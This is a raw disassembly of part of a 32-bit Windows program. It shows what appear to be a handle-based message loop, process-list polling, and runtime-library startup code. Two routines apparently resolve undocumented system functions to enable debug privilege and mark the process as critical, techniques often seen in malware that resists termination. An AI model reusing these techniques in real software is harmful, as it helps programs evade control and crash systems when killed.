  40346d:	56                   	push   %esi
  40346e:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403475:	e8 17 03 00 00       	call   0x403791
  40347a:	8b 73 18             	mov    0x18(%ebx),%esi
  40347d:	ff 76 08             	push   0x8(%esi)
  403480:	e8 ce 02 00 00       	call   0x403753
  403485:	0f 57 c0             	xorps  %xmm0,%xmm0
  403488:	6a 0c                	push   $0xc
  40348a:	66 0f d6 06          	movq   %xmm0,(%esi)
  40348e:	56                   	push   %esi
  40348f:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403496:	e8 f6 02 00 00       	call   0x403791
  40349b:	8b 73 1c             	mov    0x1c(%ebx),%esi
  40349e:	ff 76 08             	push   0x8(%esi)
  4034a1:	e8 ad 02 00 00       	call   0x403753
  4034a6:	0f 57 c0             	xorps  %xmm0,%xmm0
  4034a9:	6a 0c                	push   $0xc
  4034ab:	66 0f d6 06          	movq   %xmm0,(%esi)
  4034af:	56                   	push   %esi
  4034b0:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  4034b7:	e8 d5 02 00 00       	call   0x403791
  4034bc:	0f 57 c0             	xorps  %xmm0,%xmm0
  4034bf:	6a 20                	push   $0x20
  4034c1:	0f 11 03             	movups %xmm0,(%ebx)
  4034c4:	53                   	push   %ebx
  4034c5:	0f 11 43 10          	movups %xmm0,0x10(%ebx)
  4034c9:	e8 c3 02 00 00       	call   0x403791
  4034ce:	83 c4 38             	add    $0x38,%esp
  4034d1:	5f                   	pop    %edi
  4034d2:	5e                   	pop    %esi
  4034d3:	5b                   	pop    %ebx
  4034d4:	c3                   	ret
  4034d5:	cc                   	int3
  4034d6:	cc                   	int3
  4034d7:	cc                   	int3
  4034d8:	cc                   	int3
  4034d9:	cc                   	int3
  4034da:	cc                   	int3
  4034db:	cc                   	int3
  4034dc:	cc                   	int3
  4034dd:	cc                   	int3
  4034de:	cc                   	int3
  4034df:	cc                   	int3
  4034e0:	55                   	push   %ebp
  4034e1:	8b ec                	mov    %esp,%ebp
  4034e3:	83 ec 18             	sub    $0x18,%esp
  4034e6:	a1 04 60 41 00       	mov    0x416004,%eax
  4034eb:	33 c5                	xor    %ebp,%eax
  4034ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4034f0:	8b 45 08             	mov    0x8(%ebp),%eax
  4034f3:	53                   	push   %ebx
  4034f4:	56                   	push   %esi
  4034f5:	57                   	push   %edi
  4034f6:	8b 3d 1c f1 40 00    	mov    0x40f11c,%edi
  4034fc:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4034ff:	90                   	nop
  403500:	b9 70 40 41 00       	mov    $0x414070,%ecx
  403505:	e8 96 e9 ff ff       	call   0x401ea0
  40350a:	8b f0                	mov    %eax,%esi
  40350c:	83 fe ff             	cmp    $0xffffffff,%esi
  40350f:	75 06                	jne    0x403517
  403511:	6a 01                	push   $0x1
  403513:	ff d7                	call   *%edi
  403515:	eb e9                	jmp    0x403500
  403517:	8b 1d 64 f0 40 00    	mov    0x40f064,%ebx
  40351d:	0f 1f 00             	nopl   (%eax)
  403520:	6a 00                	push   $0x0
  403522:	56                   	push   %esi
  403523:	ff 15 d4 f0 40 00    	call   *0x40f0d4
  403529:	85 c0                	test   %eax,%eax
  40352b:	74 3c                	je     0x403569
  40352d:	6a 00                	push   $0x0
  40352f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403532:	50                   	push   %eax
  403533:	6a 04                	push   $0x4
  403535:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403538:	50                   	push   %eax
  403539:	56                   	push   %esi
  40353a:	ff 15 2c f1 40 00    	call   *0x40f12c
  403540:	85 c0                	test   %eax,%eax
  403542:	74 29                	je     0x40356d
  403544:	ff 75 f4             	push   -0xc(%ebp)
  403547:	ff 55 e8             	call   *-0x18(%ebp)
  40354a:	83 c4 04             	add    $0x4,%esp
  40354d:	c6 45 fb 4d          	movb   $0x4d,-0x5(%ebp)
  403551:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403554:	6a 00                	push   $0x0
  403556:	50                   	push   %eax
  403557:	6a 01                	push   $0x1
  403559:	8d 45 fb             	lea    -0x5(%ebp),%eax
  40355c:	50                   	push   %eax
  40355d:	56                   	push   %esi
  40355e:	ff 15 24 f1 40 00    	call   *0x40f124
  403564:	56                   	push   %esi
  403565:	ff d3                	call   *%ebx
  403567:	eb b7                	jmp    0x403520
  403569:	6a 01                	push   $0x1
  40356b:	ff d7                	call   *%edi
  40356d:	56                   	push   %esi
  40356e:	ff d3                	call   *%ebx
  403570:	eb ae                	jmp    0x403520
  403572:	cc                   	int3
  403573:	cc                   	int3
  403574:	cc                   	int3
  403575:	cc                   	int3
  403576:	cc                   	int3
  403577:	cc                   	int3
  403578:	cc                   	int3
  403579:	cc                   	int3
  40357a:	cc                   	int3
  40357b:	cc                   	int3
  40357c:	cc                   	int3
  40357d:	cc                   	int3
  40357e:	cc                   	int3
  40357f:	cc                   	int3
  403580:	55                   	push   %ebp
  403581:	8b ec                	mov    %esp,%ebp
  403583:	83 ec 10             	sub    $0x10,%esp
  403586:	a1 04 60 41 00       	mov    0x416004,%eax
  40358b:	33 c5                	xor    %ebp,%eax
  40358d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403590:	8b 45 08             	mov    0x8(%ebp),%eax
  403593:	53                   	push   %ebx
  403594:	56                   	push   %esi
  403595:	57                   	push   %edi
  403596:	68 40 9c 00 00       	push   $0x9c40
  40359b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40359e:	e8 b5 01 00 00       	call   0x403758
  4035a3:	8b f8                	mov    %eax,%edi
  4035a5:	68 40 9c 00 00       	push   $0x9c40
  4035aa:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4035ad:	e8 a6 01 00 00       	call   0x403758
  4035b2:	83 c4 08             	add    $0x8,%esp
  4035b5:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4035bc:	8b d8                	mov    %eax,%ebx
  4035be:	33 f6                	xor    %esi,%esi
  4035c0:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4035c3:	50                   	push   %eax
  4035c4:	68 40 9c 00 00       	push   $0x9c40
  4035c9:	57                   	push   %edi
  4035ca:	ff 15 14 f1 40 00    	call   *0x40f114
  4035d0:	85 c0                	test   %eax,%eax
  4035d2:	74 58                	je     0x40362c
  4035d4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4035d7:	33 ff                	xor    %edi,%edi
  4035d9:	c1 e8 02             	shr    $0x2,%eax
  4035dc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4035df:	85 c0                	test   %eax,%eax
  4035e1:	74 34                	je     0x403617
  4035e3:	33 c0                	xor    %eax,%eax
  4035e5:	8d 14 bd 00 00 00 00 	lea    0x0(,%edi,4),%edx
  4035ec:	85 f6                	test   %esi,%esi
  4035ee:	74 10                	je     0x403600
  4035f0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4035f3:	8b 0c 0a             	mov    (%edx,%ecx,1),%ecx
  4035f6:	3b 0c 83             	cmp    (%ebx,%eax,4),%ecx
  4035f9:	74 16                	je     0x403611
  4035fb:	40                   	inc    %eax
  4035fc:	3b c6                	cmp    %esi,%eax
  4035fe:	72 f6                	jb     0x4035f6
  403600:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403603:	ff 34 02             	push   (%edx,%eax,1)
  403606:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403609:	8b 40 04             	mov    0x4(%eax),%eax
  40360c:	ff d0                	call   *%eax
  40360e:	83 c4 04             	add    $0x4,%esp
  403611:	47                   	inc    %edi
  403612:	3b 7d f8             	cmp    -0x8(%ebp),%edi
  403615:	72 cc                	jb     0x4035e3
  403617:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40361a:	68 40 9c 00 00       	push   $0x9c40
  40361f:	57                   	push   %edi
  403620:	53                   	push   %ebx
  403621:	e8 4a 1c 00 00       	call   0x405270
  403626:	8b 75 f8             	mov    -0x8(%ebp),%esi
  403629:	83 c4 0c             	add    $0xc,%esp
  40362c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40362f:	ff 30                	push   (%eax)
  403631:	ff 15 1c f1 40 00    	call   *0x40f11c
  403637:	eb 87                	jmp    0x4035c0
  403639:	cc                   	int3
  40363a:	cc                   	int3
  40363b:	cc                   	int3
  40363c:	cc                   	int3
  40363d:	cc                   	int3
  40363e:	cc                   	int3
  40363f:	cc                   	int3
  403640:	55                   	push   %ebp
  403641:	8b ec                	mov    %esp,%ebp
  403643:	83 ec 10             	sub    $0x10,%esp
  403646:	a1 04 60 41 00       	mov    0x416004,%eax
  40364b:	33 c5                	xor    %ebp,%eax
  40364d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403650:	8b 45 08             	mov    0x8(%ebp),%eax
  403653:	53                   	push   %ebx
  403654:	56                   	push   %esi
  403655:	57                   	push   %edi
  403656:	8b 3d 1c f1 40 00    	mov    0x40f11c,%edi
  40365c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40365f:	90                   	nop
  403660:	b9 a8 40 41 00       	mov    $0x4140a8,%ecx
  403665:	e8 36 e8 ff ff       	call   0x401ea0
  40366a:	8b f0                	mov    %eax,%esi
  40366c:	83 fe ff             	cmp    $0xffffffff,%esi
  40366f:	75 06                	jne    0x403677
  403671:	6a 01                	push   $0x1
  403673:	ff d7                	call   *%edi
  403675:	eb e9                	jmp    0x403660
  403677:	8b 1d 64 f0 40 00    	mov    0x40f064,%ebx
  40367d:	0f 1f 00             	nopl   (%eax)
  403680:	6a 00                	push   $0x0
  403682:	56                   	push   %esi
  403683:	ff 15 d4 f0 40 00    	call   *0x40f0d4
  403689:	85 c0                	test   %eax,%eax
  40368b:	74 2c                	je     0x4036b9
  40368d:	6a 00                	push   $0x0
  40368f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403692:	50                   	push   %eax
  403693:	6a 04                	push   $0x4
  403695:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403698:	50                   	push   %eax
  403699:	56                   	push   %esi
  40369a:	ff 15 2c f1 40 00    	call   *0x40f12c
  4036a0:	85 c0                	test   %eax,%eax
  4036a2:	74 19                	je     0x4036bd
  4036a4:	83 7d f8 04          	cmpl   $0x4,-0x8(%ebp)
  4036a8:	75 13                	jne    0x4036bd
  4036aa:	56                   	push   %esi
  4036ab:	ff 75 f4             	push   -0xc(%ebp)
  4036ae:	ff 55 f0             	call   *-0x10(%ebp)
  4036b1:	83 c4 08             	add    $0x8,%esp
  4036b4:	56                   	push   %esi
  4036b5:	ff d3                	call   *%ebx
  4036b7:	eb c7                	jmp    0x403680
  4036b9:	6a 01                	push   $0x1
  4036bb:	ff d7                	call   *%edi
  4036bd:	56                   	push   %esi
  4036be:	ff d3                	call   *%ebx
  4036c0:	eb be                	jmp    0x403680
  4036c2:	cc                   	int3
  4036c3:	cc                   	int3
  4036c4:	cc                   	int3
  4036c5:	cc                   	int3
  4036c6:	cc                   	int3
  4036c7:	cc                   	int3
  4036c8:	cc                   	int3
  4036c9:	cc                   	int3
  4036ca:	cc                   	int3
  4036cb:	cc                   	int3
  4036cc:	cc                   	int3
  4036cd:	cc                   	int3
  4036ce:	cc                   	int3
  4036cf:	cc                   	int3
  4036d0:	55                   	push   %ebp
  4036d1:	8b ec                	mov    %esp,%ebp
  4036d3:	68 d8 40 41 00       	push   $0x4140d8
  4036d8:	ff 15 60 f0 40 00    	call   *0x40f060
  4036de:	85 c0                	test   %eax,%eax
  4036e0:	74 1b                	je     0x4036fd
  4036e2:	68 f8 40 41 00       	push   $0x4140f8
  4036e7:	50                   	push   %eax
  4036e8:	ff 15 8c f0 40 00    	call   *0x40f08c
  4036ee:	ff 75 0c             	push   0xc(%ebp)
  4036f1:	6a 00                	push   $0x0
  4036f3:	6a 01                	push   $0x1
  4036f5:	6a 14                	push   $0x14
  4036f7:	ff d0                	call   *%eax
  4036f9:	5d                   	pop    %ebp
  4036fa:	c2 08 00             	ret    $0x8
  4036fd:	ff 75 0c             	push   0xc(%ebp)
  403700:	33 c0                	xor    %eax,%eax
  403702:	50                   	push   %eax
  403703:	6a 01                	push   $0x1
  403705:	6a 14                	push   $0x14
  403707:	ff d0                	call   *%eax
  403709:	5d                   	pop    %ebp
  40370a:	c2 08 00             	ret    $0x8
  40370d:	cc                   	int3
  40370e:	cc                   	int3
  40370f:	cc                   	int3
  403710:	56                   	push   %esi
  403711:	68 d8 40 41 00       	push   $0x4140d8
  403716:	8b f2                	mov    %edx,%esi
  403718:	ff 15 60 f0 40 00    	call   *0x40f060
  40371e:	85 c0                	test   %eax,%eax
  403720:	74 17                	je     0x403739
  403722:	68 0c 41 41 00       	push   $0x41410c
  403727:	50                   	push   %eax
  403728:	ff 15 8c f0 40 00    	call   *0x40f08c
  40372e:	6a 00                	push   $0x0
  403730:	56                   	push   %esi
  403731:	6a 01                	push   $0x1
  403733:	ff d0                	call   *%eax
  403735:	5e                   	pop    %esi
  403736:	c2 04 00             	ret    $0x4
  403739:	33 c0                	xor    %eax,%eax
  40373b:	50                   	push   %eax
  40373c:	56                   	push   %esi
  40373d:	6a 01                	push   $0x1
  40373f:	ff d0                	call   *%eax
  403741:	5e                   	pop    %esi
  403742:	c2 04 00             	ret    $0x4
  403745:	3b 0d 04 60 41 00    	cmp    0x416004,%ecx
  40374b:	75 01                	jne    0x40374e
  40374d:	c3                   	ret
  40374e:	e9 bf 02 00 00       	jmp    0x403a12
  403753:	e9 b4 03 00 00       	jmp    0x403b0c
  403758:	55                   	push   %ebp
  403759:	8b ec                	mov    %esp,%ebp
  40375b:	5d                   	pop    %ebp
  40375c:	e9 00 00 00 00       	jmp    0x403761
  403761:	55                   	push   %ebp
  403762:	8b ec                	mov    %esp,%ebp
  403764:	eb 0d                	jmp    0x403773
  403766:	ff 75 08             	push   0x8(%ebp)
  403769:	e8 d3 21 00 00       	call   0x405941
  40376e:	59                   	pop    %ecx
  40376f:	85 c0                	test   %eax,%eax
  403771:	74 0f                	je     0x403782
  403773:	ff 75 08             	push   0x8(%ebp)
  403776:	e8 4f 22 00 00       	call   0x4059ca
  40377b:	59                   	pop    %ecx
  40377c:	85 c0                	test   %eax,%eax
  40377e:	74 e6                	je     0x403766
  403780:	5d                   	pop    %ebp
  403781:	c3                   	ret
  403782:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  403786:	0f 84 72 04 00 00    	je     0x403bfe
  40378c:	e9 50 04 00 00       	jmp    0x403be1
  403791:	55                   	push   %ebp
  403792:	8b ec                	mov    %esp,%ebp
  403794:	ff 75 08             	push   0x8(%ebp)
  403797:	e8 70 03 00 00       	call   0x403b0c
  40379c:	59                   	pop    %ecx
  40379d:	5d                   	pop    %ebp
  40379e:	c3                   	ret
  40379f:	56                   	push   %esi
  4037a0:	6a 02                	push   $0x2
  4037a2:	e8 8c 23 00 00       	call   0x405b33
  4037a7:	e8 6c 07 00 00       	call   0x403f18
  4037ac:	50                   	push   %eax
  4037ad:	e8 c9 2c 00 00       	call   0x40647b
  4037b2:	e8 5a 07 00 00       	call   0x403f11
  4037b7:	8b f0                	mov    %eax,%esi
  4037b9:	e8 54 2e 00 00       	call   0x406612
  4037be:	6a 01                	push   $0x1
  4037c0:	89 30                	mov    %esi,(%eax)
  4037c2:	e8 10 05 00 00       	call   0x403cd7
  4037c7:	83 c4 0c             	add    $0xc,%esp
  4037ca:	5e                   	pop    %esi
  4037cb:	84 c0                	test   %al,%al
  4037cd:	74 73                	je     0x403842
  4037cf:	db e2                	fnclex
  4037d1:	e8 b9 09 00 00       	call   0x40418f
  4037d6:	68 bb 41 40 00       	push   $0x4041bb
  4037db:	e8 84 06 00 00       	call   0x403e64
  4037e0:	e8 2f 07 00 00       	call   0x403f14
  4037e5:	50                   	push   %eax
  4037e6:	e8 dd 26 00 00       	call   0x405ec8
  4037eb:	59                   	pop    %ecx
  4037ec:	59                   	pop    %ecx
  4037ed:	85 c0                	test   %eax,%eax
  4037ef:	75 51                	jne    0x403842
  4037f1:	e8 28 07 00 00       	call   0x403f1e
  4037f6:	e8 7f 07 00 00       	call   0x403f7a
  4037fb:	85 c0                	test   %eax,%eax
  4037fd:	74 0b                	je     0x40380a
  4037ff:	68 11 3f 40 00       	push   $0x403f11
  403804:	e8 b1 23 00 00       	call   0x405bba
  403809:	59                   	pop    %ecx
  40380a:	e8 3f 07 00 00       	call   0x403f4e
  40380f:	e8 3a 07 00 00       	call   0x403f4e
  403814:	e8 14 07 00 00       	call   0x403f2d
  403819:	e8 f3 06 00 00       	call   0x403f11
  40381e:	50                   	push   %eax
  40381f:	e8 56 2d 00 00       	call   0x40657a
  403824:	59                   	pop    %ecx
  403825:	e8 00 07 00 00       	call   0x403f2a
  40382a:	84 c0                	test   %al,%al
  40382c:	74 05                	je     0x403833
  40382e:	e8 88 28 00 00       	call   0x4060bb
  403833:	e8 d9 06 00 00       	call   0x403f11
  403838:	e8 a1 08 00 00       	call   0x4040de
  40383d:	85 c0                	test   %eax,%eax
  40383f:	75 01                	jne    0x403842
  403841:	c3                   	ret
  403842:	6a 07                	push   $0x7
  403844:	e8 49 07 00 00       	call   0x403f92
  403849:	cc                   	int3
  40384a:	e8 0e 07 00 00       	call   0x403f5d
  40384f:	33 c0                	xor    %eax,%eax
  403851:	c3                   	ret
  403852:	e8 ce 08 00 00       	call   0x404125
  403857:	e8 b5 06 00 00       	call   0x403f11
  40385c:	50                   	push   %eax
  40385d:	e8 81 2d 00 00       	call   0x4065e3
  403862:	59                   	pop    %ecx
  403863:	c3                   	ret
  403864:	6a 14                	push   $0x14
  403866:	68 c8 47 41 00       	push   $0x4147c8
  40386b:	e8 80 09 00 00       	call   0x4041f0
  403870:	6a 01                	push   $0x1
  403872:	e8 27 04 00 00       	call   0x403c9e
  403877:	59                   	pop    %ecx
  403878:	84 c0                	test   %al,%al
  40387a:	0f 84 4a 01 00 00    	je     0x4039ca
  403880:	32 db                	xor    %bl,%bl
  403882:	88 5d e7             	mov    %bl,-0x19(%ebp)
  403885:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403889:	e8 de 03 00 00       	call   0x403c6c
  40388e:	88 45 dc             	mov    %al,-0x24(%ebp)
  403891:	a1 14 6c 41 00       	mov    0x416c14,%eax
  403896:	33 c9                	xor    %ecx,%ecx
  403898:	41                   	inc    %ecx
  403899:	3b c1                	cmp    %ecx,%eax
  40389b:	0f 84 29 01 00 00    	je     0x4039ca
  4038a1:	85 c0                	test   %eax,%eax
  4038a3:	75 49                	jne    0x4038ee
  4038a5:	89 0d 14 6c 41 00    	mov    %ecx,0x416c14
  4038ab:	68 54 f2 40 00       	push   $0x40f254
  4038b0:	68 38 f2 40 00       	push   $0x40f238
  4038b5:	e8 9e 28 00 00       	call   0x406158
  4038ba:	59                   	pop    %ecx
  4038bb:	59                   	pop    %ecx
  4038bc:	85 c0                	test   %eax,%eax
  4038be:	74 11                	je     0x4038d1
  4038c0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4038c7:	b8 ff 00 00 00       	mov    $0xff,%eax
  4038cc:	e9 e9 00 00 00       	jmp    0x4039ba
  4038d1:	68 34 f2 40 00       	push   $0x40f234
  4038d6:	68 2c f2 40 00       	push   $0x40f22c
  4038db:	e8 33 28 00 00       	call   0x406113
  4038e0:	59                   	pop    %ecx
  4038e1:	59                   	pop    %ecx
  4038e2:	c7 05 14 6c 41 00 02 	movl   $0x2,0x416c14
  4038e9:	00 00 00 
  4038ec:	eb 05                	jmp    0x4038f3
  4038ee:	8a d9                	mov    %cl,%bl
  4038f0:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4038f3:	ff 75 dc             	push   -0x24(%ebp)
  4038f6:	e8 f7 04 00 00       	call   0x403df2
  4038fb:	59                   	pop    %ecx
  4038fc:	e8 85 06 00 00       	call   0x403f86
  403901:	8b f0                	mov    %eax,%esi
  403903:	33 ff                	xor    %edi,%edi
  403905:	39 3e                	cmp    %edi,(%esi)
  403907:	74 1b                	je     0x403924
  403909:	56                   	push   %esi
  40390a:	e8 4f 04 00 00       	call   0x403d5e
  40390f:	59                   	pop    %ecx
  403910:	84 c0                	test   %al,%al
  403912:	74 10                	je     0x403924
  403914:	8b 36                	mov    (%esi),%esi
  403916:	57                   	push   %edi
  403917:	6a 02                	push   $0x2
  403919:	57                   	push   %edi
  40391a:	8b ce                	mov    %esi,%ecx
  40391c:	ff 15 24 f2 40 00    	call   *0x40f224
  403922:	ff d6                	call   *%esi
  403924:	e8 63 06 00 00       	call   0x403f8c
  403929:	8b f0                	mov    %eax,%esi
  40392b:	39 3e                	cmp    %edi,(%esi)
  40392d:	74 13                	je     0x403942
  40392f:	56                   	push   %esi
  403930:	e8 29 04 00 00       	call   0x403d5e
  403935:	59                   	pop    %ecx
  403936:	84 c0                	test   %al,%al
  403938:	74 08                	je     0x403942
  40393a:	ff 36                	push   (%esi)
  40393c:	e8 fe 2a 00 00       	call   0x40643f
  403941:	59                   	pop    %ecx
  403942:	e8 66 07 00 00       	call   0x4040ad
  403947:	0f b7 f0             	movzwl %ax,%esi
  40394a:	e8 71 27 00 00       	call   0x4060c0
  40394f:	56                   	push   %esi
  403950:	50                   	push   %eax
  403951:	57                   	push   %edi
  403952:	68 00 00 40 00       	push   $0x400000
  403957:	e8 a4 d6 ff ff       	call   0x401000
  40395c:	8b f0                	mov    %eax,%esi
  40395e:	e8 80 07 00 00       	call   0x4040e3
  403963:	84 c0                	test   %al,%al
  403965:	74 6a                	je     0x4039d1
  403967:	84 db                	test   %bl,%bl
  403969:	75 05                	jne    0x403970
  40396b:	e8 aa 2a 00 00       	call   0x40641a
  403970:	57                   	push   %edi
  403971:	6a 01                	push   $0x1
  403973:	e8 97 04 00 00       	call   0x403e0f
  403978:	59                   	pop    %ecx
  403979:	59                   	pop    %ecx
  40397a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403981:	8b c6                	mov    %esi,%eax
  403983:	eb 35                	jmp    0x4039ba
  403985:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403988:	8b 01                	mov    (%ecx),%eax
  40398a:	8b 00                	mov    (%eax),%eax
  40398c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40398f:	51                   	push   %ecx
  403990:	50                   	push   %eax
  403991:	e8 3f 20 00 00       	call   0x4059d5
  403996:	59                   	pop    %ecx
  403997:	59                   	pop    %ecx
  403998:	c3                   	ret
  403999:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40399c:	e8 42 07 00 00       	call   0x4040e3
  4039a1:	84 c0                	test   %al,%al
  4039a3:	74 32                	je     0x4039d7
  4039a5:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  4039a9:	75 05                	jne    0x4039b0
  4039ab:	e8 5b 2a 00 00       	call   0x40640b
  4039b0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4039b7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4039ba:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4039bd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4039c4:	59                   	pop    %ecx
  4039c5:	5f                   	pop    %edi
  4039c6:	5e                   	pop    %esi
  4039c7:	5b                   	pop    %ebx
  4039c8:	c9                   	leave
  4039c9:	c3                   	ret
  4039ca:	6a 07                	push   $0x7
  4039cc:	e8 c1 05 00 00       	call   0x403f92
  4039d1:	56                   	push   %esi
  4039d2:	e8 8e 2a 00 00       	call   0x406465
  4039d7:	ff 75 e0             	push   -0x20(%ebp)
  4039da:	e8 4a 2a 00 00       	call   0x406429
  4039df:	cc                   	int3
  4039e0:	e8 e1 04 00 00       	call   0x403ec6
  4039e5:	e9 7a fe ff ff       	jmp    0x403864
  4039ea:	55                   	push   %ebp
  4039eb:	8b ec                	mov    %esp,%ebp
  4039ed:	6a 00                	push   $0x0
  4039ef:	ff 15 54 f1 40 00    	call   *0x40f154
  4039f5:	ff 75 08             	push   0x8(%ebp)
  4039f8:	ff 15 50 f1 40 00    	call   *0x40f150
  4039fe:	68 09 04 00 c0       	push   $0xc0000409
  403a03:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  403a09:	50                   	push   %eax
  403a0a:	ff 15 ec f0 40 00    	call   *0x40f0ec
  403a10:	5d                   	pop    %ebp
  403a11:	c3                   	ret
  403a12:	55                   	push   %ebp
  403a13:	8b ec                	mov    %esp,%ebp
  403a15:	81 ec 24 03 00 00    	sub    $0x324,%esp
  403a1b:	6a 17                	push   $0x17
  403a1d:	ff 15 58 f1 40 00    	call   *0x40f158
  403a23:	85 c0                	test   %eax,%eax
  403a25:	74 05                	je     0x403a2c
  403a27:	6a 02                	push   $0x2
  403a29:	59                   	pop    %ecx
  403a2a:	cd 29                	int    $0x29
  403a2c:	a3 f8 69 41 00       	mov    %eax,0x4169f8
  403a31:	89 0d f4 69 41 00    	mov    %ecx,0x4169f4
  403a37:	89 15 f0 69 41 00    	mov    %edx,0x4169f0
  403a3d:	89 1d ec 69 41 00    	mov    %ebx,0x4169ec
  403a43:	89 35 e8 69 41 00    	mov    %esi,0x4169e8
  403a49:	89 3d e4 69 41 00    	mov    %edi,0x4169e4
  403a4f:	66 8c 15 10 6a 41 00 	data16 mov %ss,0x416a10
  403a56:	66 8c 0d 04 6a 41 00 	data16 mov %cs,0x416a04
  403a5d:	66 8c 1d e0 69 41 00 	data16 mov %ds,0x4169e0
  403a64:	66 8c 05 dc 69 41 00 	data16 mov %es,0x4169dc
  403a6b:	66 8c 25 d8 69 41 00 	data16 mov %fs,0x4169d8
  403a72:	66 8c 2d d4 69 41 00 	data16 mov %gs,0x4169d4
  403a79:	9c                   	pushf
  403a7a:	8f 05 08 6a 41 00    	pop    0x416a08
  403a80:	8b 45 00             	mov    0x0(%ebp),%eax
  403a83:	a3 fc 69 41 00       	mov    %eax,0x4169fc
  403a88:	8b 45 04             	mov    0x4(%ebp),%eax
  403a8b:	a3 00 6a 41 00       	mov    %eax,0x416a00
  403a90:	8d 45 08             	lea    0x8(%ebp),%eax
  403a93:	a3 0c 6a 41 00       	mov    %eax,0x416a0c
  403a98:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  403a9e:	c7 05 48 69 41 00 01 	movl   $0x10001,0x416948
  403aa5:	00 01 00 
  403aa8:	a1 00 6a 41 00       	mov    0x416a00,%eax
  403aad:	a3 04 69 41 00       	mov    %eax,0x416904
  403ab2:	c7 05 f8 68 41 00 09 	movl   $0xc0000409,0x4168f8
  403ab9:	04 00 c0 
  403abc:	c7 05 fc 68 41 00 01 	movl   $0x1,0x4168fc
  403ac3:	00 00 00 
  403ac6:	c7 05 08 69 41 00 01 	movl   $0x1,0x416908
  403acd:	00 00 00 
  403ad0:	6a 04                	push   $0x4
  403ad2:	58                   	pop    %eax
  403ad3:	6b c0 00             	imul   $0x0,%eax,%eax
  403ad6:	c7 80 0c 69 41 00 02 	movl   $0x2,0x41690c(%eax)
  403add:	00 00 00 
  403ae0:	6a 04                	push   $0x4
  403ae2:	58                   	pop    %eax
  403ae3:	6b c0 00             	imul   $0x0,%eax,%eax
  403ae6:	8b 0d 04 60 41 00    	mov    0x416004,%ecx
  403aec:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  403af0:	6a 04                	push   $0x4
  403af2:	58                   	pop    %eax
  403af3:	c1 e0 00             	shl    $0x0,%eax
  403af6:	8b 0d 00 60 41 00    	mov    0x416000,%ecx
  403afc:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  403b00:	68 80 f2 40 00       	push   $0x40f280
  403b05:	e8 e0 fe ff ff       	call   0x4039ea
  403b0a:	c9                   	leave
  403b0b:	c3                   	ret
  403b0c:	e9 07 2b 00 00       	jmp    0x406618
  403b11:	55                   	push   %ebp
  403b12:	8b ec                	mov    %esp,%ebp
  403b14:	56                   	push   %esi
  403b15:	ff 75 08             	push   0x8(%ebp)
  403b18:	8b f1                	mov    %ecx,%esi
  403b1a:	e8 58 00 00 00       	call   0x403b77
  403b1f:	c7 06 ac f2 40 00    	movl   $0x40f2ac,(%esi)
  403b25:	8b c6                	mov    %esi,%eax
  403b27:	5e                   	pop    %esi
  403b28:	5d                   	pop    %ebp
  403b29:	c2 04 00             	ret    $0x4
  403b2c:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  403b30:	8b c1                	mov    %ecx,%eax
  403b32:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  403b36:	c7 41 04 b4 f2 40 00 	movl   $0x40f2b4,0x4(%ecx)
  403b3d:	c7 01 ac f2 40 00    	movl   $0x40f2ac,(%ecx)
  403b43:	c3                   	ret
  403b44:	55                   	push   %ebp
  403b45:	8b ec                	mov    %esp,%ebp
  403b47:	56                   	push   %esi
  403b48:	ff 75 08             	push   0x8(%ebp)
  403b4b:	8b f1                	mov    %ecx,%esi
  403b4d:	e8 25 00 00 00       	call   0x403b77
  403b52:	c7 06 c8 f2 40 00    	movl   $0x40f2c8,(%esi)
  403b58:	8b c6                	mov    %esi,%eax
  403b5a:	5e                   	pop    %esi
  403b5b:	5d                   	pop    %ebp
  403b5c:	c2 04 00             	ret    $0x4
  403b5f:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  403b63:	8b c1                	mov    %ecx,%eax
  403b65:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  403b69:	c7 41 04 d0 f2 40 00 	movl   $0x40f2d0,0x4(%ecx)
  403b70:	c7 01 c8 f2 40 00    	movl   $0x40f2c8,(%ecx)
  403b76:	c3                   	ret
  403b77:	55                   	push   %ebp
  403b78:	8b ec                	mov    %esp,%ebp
